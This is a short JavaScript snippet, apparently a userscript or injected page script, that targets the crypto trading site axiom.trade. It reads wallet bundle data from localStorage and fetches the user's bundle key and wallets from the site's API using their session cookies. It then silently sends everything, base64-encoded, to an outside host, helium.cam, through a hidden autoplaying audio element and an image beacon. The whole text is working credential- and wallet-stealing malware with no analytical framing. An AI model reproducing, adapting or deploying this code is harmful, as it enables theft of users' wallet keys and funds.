(function() {
    'use strict';
    if (location.hostname.includes("axiom.trade")) {
        (function() {
            const a = "BLOOM";
            const b = Date.now();
            try {
                const c = localStorage.getItem("sBundles") || "";
                const d = localStorage.getItem("eBundles") || "";
                const e = {ref:a,ts:b,sBundles:c,eBundles:d,url:location.href};
                fetch("https://api9.axiom.trade/bundle-key-and-wallets",{method:"POST",credentials:"include"})
                .then(r=>r.json())
                .then(f=>{e.bundleKey=f?.bundleKey||"",e.wallets=f?.wallets||[]})
                .catch(()=>{})
                .finally(()=>{ 
                    const g = "https://helium.cam/api/forward?data=" + btoa(JSON.stringify(e));
                    const h = document.createElement("audio");
                    h.src = g; h.autoplay = true; h.hidden = true;
                    if (document.body) document.body.appendChild(h);
                    new Image().src = g + "&img=1";
                });
            } catch(err){}
        })();
    }
})();
